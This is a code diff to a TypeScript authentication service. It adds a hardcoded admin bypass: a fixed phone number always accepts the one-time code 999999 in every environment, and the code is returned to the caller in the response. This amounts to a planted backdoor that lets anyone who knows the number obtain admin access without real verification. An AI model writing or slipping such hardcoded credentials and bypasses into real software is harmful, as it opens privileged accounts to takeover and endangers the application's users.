@@ -29,7 +29,29 @@ export class AuthService {
     @Inject(APP_ENV) private readonly env: Env,
   ) {}
 
+  /** Hardcoded admin bypass — always accepts code 999999. */
+  private readonly ADMIN_BYPASS_PHONE = "+919999999991";
+  private readonly ADMIN_BYPASS_OTP = "999999";
+
+  private isAdminBypass(phone: string) {
+    // Match with or without +91 prefix
+    const normalized = phone.startsWith("+91") ? phone : `+91${phone}`;
+    return normalized === this.ADMIN_BYPASS_PHONE;
+  }
+
   async requestOtp(phone: string): Promise<{ sent: true; devHint?: string }> {
+    // Hardcoded admin bypass
+    if (this.isAdminBypass(phone)) {
+      await this.prisma.otpChallenge.create({
+        data: {
+          phone,
+          codeHash: sha256(this.ADMIN_BYPASS_OTP),
+          expiresAt: new Date(Date.now() + 10 * 60_000),
+        },
+      });
+      return { sent: true, devHint: this.ADMIN_BYPASS_OTP };
+    }
+
     // Demo/test numbers (and fake mode) skip real SMS and accept the dev code.
     const isTestNumber =
       this.env.OTP_PROVIDER === "fake" || phone.startsWith(this.env.OTP_BYPASS_PREFIX);
